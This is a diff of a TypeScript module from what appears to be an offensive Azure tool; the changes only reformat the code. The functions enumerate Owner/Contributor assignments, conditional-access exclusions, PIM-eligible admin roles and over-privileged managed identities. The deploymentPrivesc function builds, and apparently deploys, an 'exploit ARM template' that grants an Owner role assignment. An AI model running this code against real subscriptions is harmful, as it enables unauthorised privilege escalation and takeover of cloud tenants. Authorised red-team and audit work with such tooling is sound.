@@ -121,7 +121,13 @@ export async function customRoleExploit(args: string[], timeout: number): Promis
   }
 
   const assignments = await az(
-    ["role", "assignment", "list", "--query", "[?roleDefinitionName=='Owner' || roleDefinitionName=='Contributor'].{principal:principalName,role:roleDefinitionName,scope:scope,type:principalType}"],
+    [
+      "role",
+      "assignment",
+      "list",
+      "--query",
+      "[?roleDefinitionName=='Owner' || roleDefinitionName=='Contributor'].{principal:principalName,role:roleDefinitionName,scope:scope,type:principalType}",
+    ],
     sub,
     timeout,
   )
@@ -144,7 +150,15 @@ export async function conditionalAccessAudit(args: string[], timeout: number): P
 
   const policies = await run(
     "az",
-    ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/identity/conditionalAccessPolicies", "-o", "json"],
+    [
+      "rest",
+      "--method",
+      "GET",
+      "--url",
+      "https://graph.microsoft.com/v1.0/identity/conditionalAccessPolicies",
+      "-o",
+      "json",
+    ],
     timeout,
   )
   if (policies.exitCode !== 0) {
@@ -153,7 +167,15 @@ export async function conditionalAccessAudit(args: string[], timeout: number): P
     output.push(`\n[*] Trying alternative — check named locations...`)
     const locations = await run(
       "az",
-      ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations", "-o", "json"],
+      [
+        "rest",
+        "--method",
+        "GET",
+        "--url",
+        "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations",
+        "-o",
+        "json",
+      ],
       timeout,
     )
     if (locations.exitCode === 0) {
@@ -184,15 +206,20 @@ export async function conditionalAccessAudit(args: string[], timeout: number): P
     const users = conditions.users || {}
 
     if (users.includeUsers?.includes("All") && grant.builtInControls?.includes("mfa")) hasGlobalMfa = true
-    if (conditions.clientAppTypes?.includes("other") || conditions.clientAppTypes?.includes("exchangeActiveSync")) hasLegacyBlock = true
+    if (conditions.clientAppTypes?.includes("other") || conditions.clientAppTypes?.includes("exchangeActiveSync"))
+      hasLegacyBlock = true
 
     for (const u of users.excludeUsers || []) excludedUsers.add(u)
     for (const g of users.excludeGroups || []) excludedGroups.add(g)
 
     const includeApps = conditions.applications?.includeApplications || []
     const excludeApps = conditions.applications?.excludeApplications || []
-    output.push(`    Users: include=${JSON.stringify(users.includeUsers || []).substring(0, 80)}, exclude=${(users.excludeUsers || []).length}`)
-    output.push(`    Apps: include=${includeApps.length > 3 ? `${includeApps.length} apps` : JSON.stringify(includeApps)}, exclude=${excludeApps.length}`)
+    output.push(
+      `    Users: include=${JSON.stringify(users.includeUsers || []).substring(0, 80)}, exclude=${(users.excludeUsers || []).length}`,
+    )
+    output.push(
+      `    Apps: include=${includeApps.length > 3 ? `${includeApps.length} apps` : JSON.stringify(includeApps)}, exclude=${excludeApps.length}`,
+    )
     output.push(`    Grant: ${JSON.stringify(grant.builtInControls || [])}`)
     output.push(`    Client apps: ${JSON.stringify(conditions.clientAppTypes || [])}`)
 
@@ -304,7 +331,13 @@ export async function pimAbuse(args: string[], timeout: number): Promise<HookRes
   const eligibleList = tryJson(eligible.stdout)?.value || []
   output.push(`[+] Eligible role assignments: ${eligibleList.length}\n`)
 
-  const adminRoles = ["Global Administrator", "Privileged Role Administrator", "Security Administrator", "Exchange Administrator", "User Administrator"]
+  const adminRoles = [
+    "Global Administrator",
+    "Privileged Role Administrator",
+    "Security Administrator",
+    "Exchange Administrator",
+    "User Administrator",
+  ]
 
   for (const e of eligibleList) {
     const roleName = e.roleDefinition?.displayName || e.roleDefinitionId || "unknown"
@@ -348,8 +381,13 @@ export async function pimAbuse(args: string[], timeout: number): Promise<HookRes
     output.push(`\n[*] PIM activation policies: ${policies.length}`)
     for (const p of policies.slice(0, 10)) {
       const rules = p.rules || []
-      const approvalRule = rules.find((r: Record<string, string>) => r["@odata.type"] === "#microsoft.graph.unifiedRoleManagementPolicyApprovalRule")
-      const mfaRule = rules.find((r: Record<string, string>) => r["@odata.type"] === "#microsoft.graph.unifiedRoleManagementPolicyAuthenticationContextRule")
+      const approvalRule = rules.find(
+        (r: Record<string, string>) => r["@odata.type"] === "#microsoft.graph.unifiedRoleManagementPolicyApprovalRule",
+      )
+      const mfaRule = rules.find(
+        (r: Record<string, string>) =>
+          r["@odata.type"] === "#microsoft.graph.unifiedRoleManagementPolicyAuthenticationContextRule",
+      )
       if (approvalRule) {
         const needsApproval = approvalRule.setting?.isApprovalRequired
         if (!needsApproval) {
@@ -423,7 +461,12 @@ export async function managedIdentityPrivesc(args: string[], timeout: number): P
   const output: string[] = ["[*] Analyzing managed identity RBAC assignments...\n"]
 
   const identities = await az(
-    ["identity", "list", "--query", "[].{name:name,rg:resourceGroup,principalId:principalId,clientId:clientId,type:type}"],
+    [
+      "identity",
+      "list",
+      "--query",
+      "[].{name:name,rg:resourceGroup,principalId:principalId,clientId:clientId,type:type}",
+    ],
     sub,
     timeout,
   )
@@ -439,7 +482,14 @@ export async function managedIdentityPrivesc(args: string[], timeout: number): P
   }
 
   const assignments = await az(
-    ["role", "assignment", "list", "--all", "--query", "[?principalType=='ServicePrincipal'].{principal:principalName,role:roleDefinitionName,scope:scope,principalId:principalId}"],
+    [
+      "role",
+      "assignment",
+      "list",
+      "--all",
+      "--query",
+      "[?principalType=='ServicePrincipal'].{principal:principalName,role:roleDefinitionName,scope:scope,principalId:principalId}",
+    ],
     sub,
     timeout,
   )
@@ -449,7 +499,13 @@ export async function managedIdentityPrivesc(args: string[], timeout: number): P
   const spAssignments = tryJson(assignments.stdout) || []
   output.push(`\n[+] Service principal role assignments: ${spAssignments.length}`)
 
-  const highPrivRoles = ["Owner", "Contributor", "User Access Administrator", "Virtual Machine Contributor", "Key Vault Administrator"]
+  const highPrivRoles = [
+    "Owner",
+    "Contributor",
+    "User Access Administrator",
+    "Virtual Machine Contributor",
+    "Key Vault Administrator",
+  ]
   const overPrivileged: Record<string, string[]> = {}
 
   for (const a of spAssignments) {
@@ -478,7 +534,12 @@ export async function managedIdentityPrivesc(args: string[], timeout: number): P
   }
 
   const vms = await az(
-    ["vm", "list", "--query", "[?identity].{name:name,rg:resourceGroup,identityType:identity.type,principalId:identity.principalId,userAssigned:identity.userAssignedIdentities}"],
+    [
+      "vm",
+      "list",
+      "--query",
+      "[?identity].{name:name,rg:resourceGroup,identityType:identity.type,principalId:identity.principalId,userAssigned:identity.userAssignedIdentities}",
+    ],
     sub,
     timeout,
   )
@@ -524,7 +585,15 @@ export async function deploymentPrivesc(args: string[], timeout: number): Promis
   output.push(`    Subscription: ${acct?.name} (${acct?.id})`)
 
   const perms = await az(
-    ["role", "assignment", "list", "--assignee", acct?.user?.name || "", "--query", "[].{role:roleDefinitionName,scope:scope}"],
+    [
+      "role",
+      "assignment",
+      "list",
+      "--assignee",
+      acct?.user?.name || "",
+      "--query",
+      "[].{role:roleDefinitionName,scope:scope}",
+    ],
     sub,
     timeout,
   )
@@ -533,10 +602,11 @@ export async function deploymentPrivesc(args: string[], timeout: number): Promis
     output.push(`\n[+] Current role assignments:`)
     for (const p of permList) output.push(`    ${p.role} at ${p.scope}`)
 
-    const canDeploy = permList.some((p: Record<string, string>) =>
-      ["Owner", "Contributor"].includes(p.role) ||
-      p.role === "Template Spec Contributor" ||
-      p.role === "Resource Policy Contributor",
+    const canDeploy = permList.some(
+      (p: Record<string, string>) =>
+        ["Owner", "Contributor"].includes(p.role) ||
+        p.role === "Template Spec Contributor" ||
+        p.role === "Resource Policy Contributor",
     )
 
     if (canDeploy) {
@@ -554,7 +624,7 @@ export async function deploymentPrivesc(args: string[], timeout: number): Promis
 
       output.push(`\n[*] Exploit ARM template (creates Owner role assignment):`)
       const template = {
-        "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+        $schema: "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
         contentVersion: "1.0.0.0",
         parameters: {
           principalId: { type: "string" },
@@ -566,7 +636,8 @@ export async function deploymentPrivesc(args: string[], timeout: number): Promis
             apiVersion: "2022-04-01",
             name: "[guid(parameters('principalId'), parameters('roleDefinitionId'))]",
             properties: {
-              roleDefinitionId: "[subscriptionResourceId('Microsoft.Authorization/roleDefinitions', parameters('roleDefinitionId'))]",
+              roleDefinitionId:
+                "[subscriptionResourceId('Microsoft.Authorization/roleDefinitions', parameters('roleDefinitionId'))]",
               principalId: "[parameters('principalId')]",
               principalType: "ServicePrincipal",
             },
@@ -613,7 +684,9 @@ export async function deploymentPrivesc(args: string[], timeout: number): Promis
             output.push(`[-] Deployment failed: ${deploy.stderr.trim().substring(0, 300)}`)
           }
         } finally {
-          try { await Bun.file(tmpFile).exists() && (await run("rm", ["-f", tmpFile], 5)) } catch {}
+          try {
+            ;(await Bun.file(tmpFile).exists()) && (await run("rm", ["-f", tmpFile], 5))
+          } catch {}
         }
       }
     } else {
